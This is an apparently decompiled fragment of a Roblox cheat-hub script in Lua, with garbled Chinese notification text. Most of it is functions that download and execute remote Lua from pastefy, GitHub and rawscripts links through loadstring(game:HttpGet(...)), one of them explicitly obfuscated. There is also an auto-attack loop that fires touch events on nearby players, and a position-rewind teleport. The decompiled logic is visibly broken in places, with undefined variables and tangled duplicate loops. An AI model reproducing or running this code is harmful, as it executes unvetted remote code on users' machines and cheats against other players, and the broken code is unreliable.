    loadstring(game:HttpGet("https://pastefy.app/7rv5KarK/raw"))
end

local function Job41()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AFKZxc/ERT.MAIN/main/DMK.lua"))
end

local function Job42(playerJoinNotify)
    x6.PlayerJoinNotify = playerJoinNotify
    return playerJoinNotify, x6
end

local function runProtected2(Request7)
    local function Job43()
        local Players = game:GetService("Players")
        local HeadShot = Enum.ThumbnailType.HeadShot
        local Size420x420 = Enum.ThumbnailSize.Size420x420
        return Players:GetUserThumbnailAsync(Request7.UserId, HeadShot, Size420x420)
    end
    local Unpacked10 = x6
    local PlayerJoinNotify = x6.PlayerJoinNotify
    local Element59, Element60, Element61, Pack8
    if PlayerJoinNotify then
        Unpacked10 = Job43
        Pack8 = table.pack(pcall(Job43))
        local Element62 = {}
        Element59 = Element62
        Element62.Title = "ç©å®¶è¿å¥"
        Element61 = " (@" .. Request7.Name .. ")"
        Element62.Content = Request7.DisplayName .. Element61
        Element62.Icon = "user"
        Element62.Duration = 5
        PlayerJoinNotify = table.unpack(Pack8, 1, Pack8.Unpacked5)
        Element60 = PlayerJoinNotify
        if Element60 then
            Unpacked10 = table.unpack(Pack8, 2, Pack8.Unpacked5)
            Element60 = Unpacked10
        end
        if not Element60 then
            Element60 = nil
        end
        Element59.Background = Element60
        Element31:Notify(Element59)
    end
    return Request7, PlayerJoinNotify, Unpacked10
end

local function runProtected3(Request8)
    local function Job44()
        local Players = game:GetService("Players")
        local HeadShot2 = Enum.ThumbnailType.HeadShot
        local Size420x4202 = Enum.ThumbnailSize.Size420x420
        return Players:GetUserThumbnailAsync(Request8.UserId, HeadShot2, Size420x4202)
    end
    local Unpacked11 = x6
    local PlayerJoinNotify2 = x6.PlayerJoinNotify
    local Element63, Element64, Element65, Pack9
    if PlayerJoinNotify2 then
        Unpacked11 = Job44
        Pack9 = table.pack(pcall(Job44))
        local Element66 = {}
        Element63 = Element66
        Element66.Title = "ç©å®¶éåº"
        Element65 = " (@" .. Request8.Name .. ")"
        Element66.Content = Request8.DisplayName .. Element65
        Element66.Icon = "user"
        Element66.Duration = 5
        PlayerJoinNotify2 = table.unpack(Pack9, 1, Pack9.Unpacked5)
        Element64 = PlayerJoinNotify2
        if Element64 then
            Unpacked11 = table.unpack(Pack9, 2, Pack9.Unpacked5)
            Element64 = Unpacked11
        end
        if not Element64 then
            Element64 = nil
        end
        Element63.Background = Element64
        Element31:Notify(Element63)
    end
    return Request8, PlayerJoinNotify2, Unpacked11
end

local function Job45()
    loadstring(game:HttpGet("https://pastefy.app/0jHaLSUh/raw"))
end

local function Job46()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/396abc/Script/refs/heads/main/MobileFly.lua"))
end

local function Job47()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E6%97%A0%E6%95%8C%E5%B0%91%E4%BE%A0%E9%A3%9E%E8%A1%8Cr6.txt"))
end

local function Job48()
    loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))
end

local function Job49()
    loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))
end

local function Job50()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/kill/refs/heads/main/kill"))
end

local function Job51()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))
end

local function Job52()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-Menu-By-Me-19427"))
end

local function Job53()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/XvPxOL/refs/heads/main/F3X%20gui.lua"))
end

local function Job54()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-synb-56505"))
end

local function Job55()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Egor-simple-ui-91106"))
end

local function Job56()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pl11451481mvcxz/pro/refs/heads/main/Flying%20car"))
end

local function Job57()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/-/refs/heads/main/%E7%A5%96%E5%9B%BD%E4%BA%BA%E6%B1%89%E5%8C%96"))
end

local function Job58()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/giobolqv1/A-Train-by-GioBolqv1-/refs/heads/main/train.lua"))
end

local function Job59(Request9)
    local Players
    local function Job60(Request10)
        return (Request10 or Players).Character
    end
    local function Flag(Instance6)
        if Instance6 then
            Instance6:IsA("Player")
        end
        return nil
    end
    local function Job61(Request11)
        local Element67 = Request11
        if Request11 then
            Element67 = 0 < Request11.Health
        end
        return Element67
    end
    local Players, Runservice3
    local function getPlayers2(Request12)
        Players:GetPlayers()
        local Element68
        local Element69 = ipairs(Element68)
        local Pack10 = table.pack(Element69(Element68, 0))
        local Unpacked12 = table.unpack(Pack10, 1, Pack10.Element69)
        local Element70 = {}
        local Element71, Unpacked13
        if not (Unpacked12 == nil) then
            Element71 = Unpacked12
            while true do
                if Pack10[2] ~= Players then
                    Unpacked13 = Runservice3(table.unpack(Pack10, 2, Pack10.Element69))
                    if Unpacked13 then
                        table.insert(Element70, Unpacked13)
                        Pack10 = table.pack(Element69(Element68, Element71))
                        Unpacked12 = table.unpack(Pack10, 1, Pack10.Element69)
                        if not (Unpacked12 == nil) then
                            Element71 = Unpacked12
                            continue
                        end
                    else
                        Pack10 = table.pack(Element69(Element68, Element71))
                        Unpacked12 = table.unpack(Pack10, 1, Pack10.Element69)
                        if Unpacked12 == nil then
                            break
                        else
                            Element71 = Unpacked12
                            continue
                        end
                    end
                else
                    Pack10 = table.pack(Element69(Element68, Element71))
                    Unpacked12 = table.unpack(Pack10, 1, Pack10.Element69)
                    if Unpacked12 == nil then
                        break
                    else
                        Element71 = Unpacked12
                        continue
                    end
                end
                return Element70
            end
        end
        return Element70
    end
    local RunService, Bindableevent, Element72, Element73
    local function Job62(...)
        local Element74 = Runservice3()
        local Humanoid12, Element75, Handle, Element76, Element77, Element78, Element79, CFrame3, Element80, Size, Unpacked14, Element81, Pack11
        if Element74 then
            Humanoid12 = Element74:FindFirstChild("Humanoid")
            if Humanoid12 and 0 < Humanoid12.Health then
                Element75 = Element74:FindFirstChildWhichIsA("Tool")
                if Element75 then
                    Handle = Element75:FindFirstChild("Handle")
                    if Handle then
                        Element76 = Element73(Element74)
                        Element77 = OverlapParams.new()
                        Element77.FilterType = Enum.RaycastFilterType.Include
                        Element77.FilterDescendantsInstances = Element76
                        CFrame3 = Handle.CFrame
                        Size = Handle.Size
                        Pack11 = {
                        print = print,
                        type = type,
                        tostring = tostring,
                        tonumber = tonumber,
                        next = next,
                        pairs = pairs,
                        ipairs = ipairs,
                        select = select,
                        rawget = rawget,
                        rawset = rawset,
                        rawequal = rawequal,
                        rawlen = rawlen,
                        setmetatable = setmetatable,
                        getmetatable = getmetatable,
                        assert = assert,
                        error = error,
                        pcall = pcall,
                        xpcall = xpcall,
                        unpack = unpack,
                        getfenv = getfenv,
                        setfenv = setfenv,
                        collectgarbage = collectgarbage,
                        gcinfo = gcinfo,
                        newproxy = newproxy,
                        require = require,
                        load = load,
                        loadstring = load,
                        _VERSION = "Lua 5.1",
                        string = string,
                        table = table,
                        math = math,
                        bit32 = bit32,
                        bit = bit32,
                        os = os,
                        io = io,
                        utf8 = utf8,
                        debug = debug,
                        coroutine = coroutine,
                        buffer = buffer,
                        game = game,
                        Game = game,
                        workspace = workspace,
                        Workspace = workspace,
                        script = script,
                        shared = shared,
                        plugin = plugin,
                        Instance = Instance,
                        Vector2 = Vector2,
                        Vector3 = Vector3,
                        Vector2int16 = Vector2int16,
                        Vector3int16 = Vector3int16,
                        CFrame = CFrame,
                        Color3 = Color3,
                        UDim = UDim,
                        UDim2 = UDim2,
                        Rect = Rect,
                        Region3 = Region3,
                        Ray = Ray,
                        NumberRange = NumberRange,
                        NumberSequence = NumberSequence,
                        NumberSequenceKeypoint = NumberSequenceKeypoint,
                        ColorSequence = ColorSequence,
                        ColorSequenceKeypoint = ColorSequenceKeypoint,
                        BrickColor = BrickColor,
                        TweenInfo = TweenInfo,
                        PhysicalProperties = PhysicalProperties,
                        Faces = Faces,
                        Axes = Axes,
                        Random = Random,
                        DateTime = DateTime,
                        Font = Font,
                        OverlapParams = OverlapParams,
                        RaycastParams = RaycastParams,
                        Enum = Enum,
                        wait = wait,
                        tick = tick,
                        time = time,
                        elapsedTime = elapsedTime,
                        typeof = typeof,
                        warn = warn,
                        spawn = spawn,
                        delay = delay,
                        task = task,
                        getgenv = getgenv,
                        getrenv = getrenv,
                        getsenv = getsenv,
                        getreg = getreg,
                        getgc = getgc,
                        getloadedmodules = getloadedmodules,
                        getinstances = getinstances,
                        getnilinstances = getnilinstances,
                        getscripts = getscripts,
                        getconnections = getconnections,
                        getrunningscripts = getrunningscripts,
                        getcallingscript = getcallingscript,
                        gethui = gethui,
                        getthreadidentity = getthreadidentity,
                        setthreadidentity = setthreadidentity,
                        checkcaller = checkcaller,
                        islclosure = islclosure,
                        iscclosure = iscclosure,
                        isourclosure = isourclosure,
                        is_synapse_function = is_synapse_function,
                        clonefunction = clonefunction,
                        cloneref = cloneref,
                        compareinstances = compareinstances,
                        newcclosure = newcclosure,
                        hookfunction = hookfunction,
                        replaceclosure = replaceclosure,
                        hookmetamethod = hookmetamethod,
                        getrawmetatable = getrawmetatable,
                        setrawmetatable = setrawmetatable,
                        setreadonly = setreadonly,
                        isreadonly = isreadonly,
                        make_writeable = make_writeable,
                        make_readonly = make_readonly,
                        identifyexecutor = identifyexecutor,
                        getexecutorname = getexecutorname,
                        setclipboard = setclipboard,
                        toclipboard = toclipboard,
                        setfpscap = setfpscap,
                        firetouchinterest = firetouchinterest,
                        fireclickdetector = fireclickdetector,
                        fireproximityprompt = fireproximityprompt,
                        keypress = keypress,
                        keyrelease = keyrelease,
                        mouse1click = mouse1click,
                        mouse1press = mouse1press,
                        mouse1release = mouse1release,
                        mousemoverel = mousemoverel,
                        queue_on_teleport = queue_on_teleport,
                        saveinstance = saveinstance,
                        decompile = decompile,
                        getscriptclosure = getscriptclosure,
                        getfunctionhash = getfunctionhash,
                        getcustomasset = getcustomasset,
                        rconsoleprint = rconsoleprint,
                        rconsolename = rconsolename,
                        rconsoleclear = rconsoleclear,
                        setfflag = setfflag,
                        protectgui = protectgui,
                        unprotectgui = unprotectgui,
                        sethiddenproperty = sethiddenproperty,
                        gethiddenproperty = gethiddenproperty,
                        isnetworkowner = isnetworkowner,
                        isfile = isfile,
                        isfolder = isfolder,
                        makefolder = makefolder,
                        delfile = delfile,
                        delfolder = delfolder,
                        listfiles = listfiles,
                        readfile = readfile,
                        writefile = writefile,
                        appendfile = appendfile,
                        loadfile = loadfile,
                        dofile = dofile,
                        request = request,
                        http_request = request,
                        crypt = crypt,
                        base64_encode = base64_encode,
                        base64_decode = base64_decode,
                        base64encode = base64_encode,
                        base64decode = base64_decode,
                        syn = syn,
                        WebSocket = WebSocket,
                        Drawing = Drawing,
                        DrawingImmediate = Drawing,
                        }
                        Pack11._G = Pack11
                        workspace:GetPartBoundsInBox(CFrame3, Size + Pack11.configs.Size, Element77)
                        Element79 = ipairs(Element78)
                        CFrame3 = Element78
                        Pack11 = table.pack(Element79(CFrame3, 0))
                        Size = table.unpack(Pack11, 1, Pack11.Element75)
                        if Size == nil then
                            local __cont12 = false
                            while true do
                                Humanoid12 = RunService.Heartbeat
                                Element75 = Humanoid12
                                Humanoid12.Wait(Element75)
                                while true do
                                    Element74 = Runservice3()
                                    if not Element74 then
                                        Humanoid12 = RunService.Heartbeat
                                        Element75 = Humanoid12
                                        Humanoid12.Wait(Element75)
                                        continue
                                    end
                                    Handle = "Humanoid"
                                    Humanoid12 = Element74:FindFirstChild("Humanoid")
                                    if not Humanoid12 then
                                        Humanoid12 = RunService.Heartbeat
                                        Element75 = Humanoid12
                                        Humanoid12.Wait(Element75)
                                        continue
                                    end
                                    Handle = Humanoid12.Health
                                    if 0 >= Handle then
                                        Humanoid12 = RunService.Heartbeat
                                        Element75 = Humanoid12
                                        Humanoid12.Wait(Element75)
                                        continue
                                    end
                                    Handle = Element74
                                    Element75 = Element74:FindFirstChildWhichIsA("Tool")
                                    if not Element75 then
                                        Humanoid12 = RunService.Heartbeat
                                        Element75 = Humanoid12
                                        Humanoid12.Wait(Element75)
                                        continue
                                    end
                                    Handle = Element75:FindFirstChild("Handle")
                                    if not Handle then
                                        Humanoid12 = RunService.Heartbeat
                                        Element75 = Humanoid12
                                        Humanoid12.Wait(Element75)
                                        continue
                                    end
                                    break
                                end
                                Element76 = Element73(Element74)
                                Element77 = OverlapParams.new(select(6, ...))
                                Element77.FilterType = Enum.RaycastFilterType.Include
                                Element77.FilterDescendantsInstances = Element76
                                workspace:GetPartBoundsInBox(Handle.CFrame, Handle.Size + getgenv(select(14, ...)).configs.Size, Element77)
                                Element79 = ipairs(Element78)
                                CFrame3 = Element78
                                Pack11 = table.pack(Element79(CFrame3, 0))
                                Size = table.unpack(Pack11, 1, Pack11.Element75)
                                if Size == nil then
                                    continue
                                end
                                Element80 = Size
                                while true do
                                    Unpacked14 = table.unpack(Pack11, 2, Pack11.Element75)
                                    Element81 = Unpacked14:FindFirstAncestorWhichIsA("Model")
                                    if not Element81 then
                                        Pack11 = table.pack(Element79(CFrame3, Element80))
                                        Size = table.unpack(Pack11, 1, Pack11.Element75)
                                        if Size == nil then
                                            break
                                        end
                                        Element80 = Size
                                        continue
                                    end
                                    if not Element72(Bindableevent(Element81)) then
                                        Pack11 = table.pack(Element79(CFrame3, Element80))
                                        Size = table.unpack(Pack11, 1, Pack11.Element75)
                                        if Size == nil then
                                            break
                                        end
                                        Element80 = Size
                                        continue
                                    end
                                    Element75:Activate()
                                    firetouchinterest(Handle, Unpacked14, 1)
                                    firetouchinterest(Handle, Unpacked14, 0)
                                    Pack11 = table.pack(Element79(CFrame3, Element80))
                                    Size = table.unpack(Pack11, 1, Pack11.Element75)
                                    if Size == nil then
                                        __cont12 = true
                                        break
                                    end
                                    Element80 = Size
                                end
                                if __cont12 then
                                    __cont12 = false
                                    continue
                                end
                            end
                        else
                            Element80 = Size
                            while true do
                                Unpacked14 = table.unpack(Pack11, 2, Pack11.Element75)
                                Element81 = Unpacked14:FindFirstAncestorWhichIsA("Model")
                                if not Element81 then
                                    Pack11 = table.pack(Element79(CFrame3, Element80))
                                    Size = table.unpack(Pack11, 1, Pack11.Element75)
                                    if Size == nil then
                                        while true do
                                            Humanoid12 = RunService.Heartbeat
                                            Element75 = Humanoid12
                                            Humanoid12.Wait(Element75)
                                            while true do
                                                Element74 = Runservice3()
                                                if not Element74 then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = "Humanoid"
                                                Humanoid12 = Element74:FindFirstChild("Humanoid")
                                                if not Humanoid12 then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = Humanoid12.Health
                                                if 0 >= Handle then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = Element74
                                                Element75 = Element74:FindFirstChildWhichIsA("Tool")
                                                if not Element75 then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = Element75:FindFirstChild("Handle")
                                                if not Handle then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                break
                                            end
                                            Element76 = Element73(Element74)
                                            Element77 = OverlapParams.new(select(6, ...))
                                            Element77.FilterType = Enum.RaycastFilterType.Include
                                            Element77.FilterDescendantsInstances = Element76
                                            workspace:GetPartBoundsInBox(Handle.CFrame, Handle.Size + getgenv(select(14, ...)).configs.Size, Element77)
                                            Element79 = ipairs(Element78)
                                            CFrame3 = Element78
                                            Pack11 = table.pack(Element79(CFrame3, 0))
                                            Size = table.unpack(Pack11, 1, Pack11.Element75)
                                            if Size ~= nil then
                                                break
                                            end
                                        end
                                        Element80 = Size
                                        continue
                                    end
                                    Element80 = Size
                                    continue
                                end
                                if not Element72(Bindableevent(Element81)) then
                                    Pack11 = table.pack(Element79(CFrame3, Element80))
                                    Size = table.unpack(Pack11, 1, Pack11.Element75)
                                    if Size == nil then
                                        while true do
                                            Humanoid12 = RunService.Heartbeat
                                            Element75 = Humanoid12
                                            Humanoid12.Wait(Element75)
                                            while true do
                                                Element74 = Runservice3()
                                                if not Element74 then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = "Humanoid"
                                                Humanoid12 = Element74:FindFirstChild("Humanoid")
                                                if not Humanoid12 then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = Humanoid12.Health
                                                if 0 >= Handle then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = Element74
                                                Element75 = Element74:FindFirstChildWhichIsA("Tool")
                                                if not Element75 then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                Handle = Element75:FindFirstChild("Handle")
                                                if not Handle then
                                                    Humanoid12 = RunService.Heartbeat
                                                    Element75 = Humanoid12
                                                    Humanoid12.Wait(Element75)
                                                    continue
                                                end
                                                break
                                            end
                                            Element76 = Element73(Element74)
                                            Element77 = OverlapParams.new(select(6, ...))
                                            Element77.FilterType = Enum.RaycastFilterType.Include
                                            Element77.FilterDescendantsInstances = Element76
                                            workspace:GetPartBoundsInBox(Handle.CFrame, Handle.Size + getgenv(select(14, ...)).configs.Size, Element77)
                                            Element79 = ipairs(Element78)
                                            CFrame3 = Element78
                                            Pack11 = table.pack(Element79(CFrame3, 0))
                                            Size = table.unpack(Pack11, 1, Pack11.Element75)
                                            if Size ~= nil then
                                                break
                                            end
                                        end
                                        Element80 = Size
                                        continue
                                    end
                                    Element80 = Size
                                    continue
                                end
                                Element75:Activate()
                                firetouchinterest(Handle, Unpacked14, 1)
                                firetouchinterest(Handle, Unpacked14, 0)
                                Pack11 = table.pack(Element79(CFrame3, Element80))
                                Size = table.unpack(Pack11, 1, Pack11.Element75)
                                if Size == nil then
                                    while true do
                                        Humanoid12 = RunService.Heartbeat
                                        Element75 = Humanoid12
                                        Humanoid12.Wait(Element75)
                                        while true do
                                            Element74 = Runservice3()
                                            if not Element74 then
                                                Humanoid12 = RunService.Heartbeat
                                                Element75 = Humanoid12
                                                Humanoid12.Wait(Element75)
                                                continue
                                            end
                                            Handle = "Humanoid"
                                            Humanoid12 = Element74:FindFirstChild("Humanoid")
                                            if not Humanoid12 then
                                                Humanoid12 = RunService.Heartbeat
                                                Element75 = Humanoid12
                                                Humanoid12.Wait(Element75)
                                                continue
                                            end
                                            Handle = Humanoid12.Health
                                            if 0 >= Handle then
                                                Humanoid12 = RunService.Heartbeat
                                                Element75 = Humanoid12
                                                Humanoid12.Wait(Element75)
                                                continue
                                            end
                                            Handle = Element74
                                            Element75 = Element74:FindFirstChildWhichIsA("Tool")
                                            if not Element75 then
                                                Humanoid12 = RunService.Heartbeat
                                                Element75 = Humanoid12
                                                Humanoid12.Wait(Element75)
                                                continue
                                            end
                                            Handle = Element75:FindFirstChild("Handle")
                                            if not Handle then
                                                Humanoid12 = RunService.Heartbeat
                                                Element75 = Humanoid12
                                                Humanoid12.Wait(Element75)
                                                continue
                                            end
                                            break
                                        end
                                        Element76 = Element73(Element74)
                                        Element77 = OverlapParams.new(select(6, ...))
                                        Element77.FilterType = Enum.RaycastFilterType.Include
                                        Element77.FilterDescendantsInstances = Element76
                                        workspace:GetPartBoundsInBox(Handle.CFrame, Handle.Size + getgenv(select(14, ...)).configs.Size, Element77)
                                        Element79 = ipairs(Element78)
                                        CFrame3 = Element78
                                        Pack11 = table.pack(Element79(CFrame3, 0))
                                        Size = table.unpack(Pack11, 1, Pack11.Element75)
                                        if Size ~= nil then
                                            break
                                        end
                                    end
                                    Element80 = Size
                                    continue
                                end
                                Element80 = Size
                            end
                        end
                    end
                end
            end
        end
        RunService.Heartbeat:Wait()
        local __cont3 = false
        while true do
            Element74 = Runservice3()
            if not Element74 then
                RunService.Heartbeat:Wait()
                continue
            end
            Humanoid12 = Element74:FindFirstChild("Humanoid")
            if not Humanoid12 then
                RunService.Heartbeat:Wait()
                continue
            end
            if 0 >= Humanoid12.Health then
                RunService.Heartbeat:Wait()
                continue
            end
            Element75 = Element74:FindFirstChildWhichIsA("Tool")
            if not Element75 then
                RunService.Heartbeat:Wait()
                continue
            end
            Handle = Element75:FindFirstChild("Handle")
            if not Handle then
                RunService.Heartbeat:Wait()
                continue
            end
            Element76 = Element73(Element74)
            Element77 = OverlapParams.new(select(6, ...))
            Element77.FilterType = Enum.RaycastFilterType.Include
            Element77.FilterDescendantsInstances = Element76
            workspace:GetPartBoundsInBox(Handle.CFrame, Handle.Size + getgenv(select(14, ...)).configs.Size, Element77)
            Element79 = ipairs(Element78)
            CFrame3 = Element78
            Pack11 = table.pack(Element79(CFrame3, 0))
            Size = table.unpack(Pack11, 1, Pack11.Element75)
            if Size == nil then
                RunService.Heartbeat:Wait()
                continue
            end
            Element80 = Size
            while true do
                Unpacked14 = table.unpack(Pack11, 2, Pack11.Element75)
                Element81 = Unpacked14:FindFirstAncestorWhichIsA("Model")
                if not Element81 then
                    Pack11 = table.pack(Element79(CFrame3, Element80))
                    Size = table.unpack(Pack11, 1, Pack11.Element75)
                    if Size == nil then
                        break
                    end
                    Element80 = Size
                    continue
                end
                if not Element72(Bindableevent(Element81)) then
                    Pack11 = table.pack(Element79(CFrame3, Element80))
                    Size = table.unpack(Pack11, 1, Pack11.Element75)
                    if Size == nil then
                        break
                    end
                    Element80 = Size
                    continue
                end
                Element75:Activate()
                firetouchinterest(Handle, Unpacked14, 1)
                firetouchinterest(Handle, Unpacked14, 0)
                Pack11 = table.pack(Element79(CFrame3, Element80))
                Size = table.unpack(Pack11, 1, Pack11.Element75)
                if Size == nil then
                    RunService.Heartbeat:Wait()
                    __cont3 = true
                    break
                end
                Element80 = Size
            end
            if __cont3 then
                __cont3 = false
                continue
            end
            RunService.Heartbeat:Wait()
        end
    end
    local Element82
    if Request9 then
        Element82 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element82._G = Element82
        Players = Element82
        local Element83 = {}
        Players = Element83
        Element83.connections = {}
        Bindableevent = "BindableEvent"
        Players.Disable = Instance.new("BindableEvent")
        Bindableevent = 10
        Element72 = 10
        Element73 = 10
        Players.Size = Vector3.new(10, 10, 10)
        Runservice3 = true
        Players.DeathCheck = true
        RunService = Players
        Players.configs = Players
        Players = "Players"
        RunService = game
        Players = game:GetService("Players")
        Runservice3 = "RunService"
        Players = game
        RunService = game:GetService("RunService")
        Players = Players.LocalPlayer
        Runservice3 = Job60
        Bindableevent = Flag
        Element72 = Job61
        Element73 = getPlayers2
        task.spawn(Job62)
        Element31:Notify({
        Title = "å·²å¼å¯",
        Content = "é è¿èªå¨æ»å»",
        Icon = "check",
        Duration = 3,
        })
        return Request9, Players, RunService, Players, Runservice3, Bindableevent, Element72, Element73
    else
        RunService = nil
        getgenv().configs = nil
        local Element84 = {}
        Players = Element84
        Element84.Title = "å·²å³é­"
        Element84.Content = "åæ­¢èªå¨æ»å»"
        Element84.Icon = "x"
        Runservice3 = 3
        Element84.Duration = 3
        RunService = Element31
        Players = Element31.Notify
        Players(Element31, Element84)
        return Request9
    end
end

local function Job63()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-noob-all-110242"))
end

local function Job64()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/giobolqv1/invincible-characters-animations-by-GioBolqv1-/refs/heads/main/universal.lua"))
end

local function Job65()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/wzhxll/Willow-the-Invincible/refs/heads/main/(%C3%A9%C3%A5%C2%B2%C3%A7)%204-obfuscated%20(4).lua"))
end

local function Job66()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/j45wfj/Change-key/refs/heads/main/%E4%BF%AE%E6%94%B9%E9%94%AE%E4%BD%8D%E5%8A%A0%E5%AF%86.lua"))
end

local function Job67(Request13)
    local function Job68()
        local ScreenGui
        local function Instance7()
            ScreenGui:Destroy()
        end
        local HumanoidRootPart6, Textlabel
        local function processItems3(...)
            local Element85 = {
            time = 1700000000.0166667,
            position = HumanoidRootPart6.Position,
            }
            table.insert(Textlabel, Element85)
            while true do
                if 0 < #Textlabel and Textlabel[1].time < tick(select(5, ...)) -3 then
                    table.remove(Textlabel, 1)
                    continue
                end
                break
            end
        end
        local function updateState()
            local position3
            if 0 < #Textlabel then
                position3 = Textlabel[1].position
                HumanoidRootPart6.CFrame = CFrame.new(position3)
            end
        end
        local Playergui, Element86
        local function RenderStepped(...)
            local Element87 = {
            print = print,
            type = type,
            tostring = tostring,
            tonumber = tonumber,
            next = next,
            pairs = pairs,
            ipairs = ipairs,
            select = select,
            rawget = rawget,
            rawset = rawset,
            rawequal = rawequal,
            rawlen = rawlen,
            setmetatable = setmetatable,
            getmetatable = getmetatable,
            assert = assert,
            error = error,
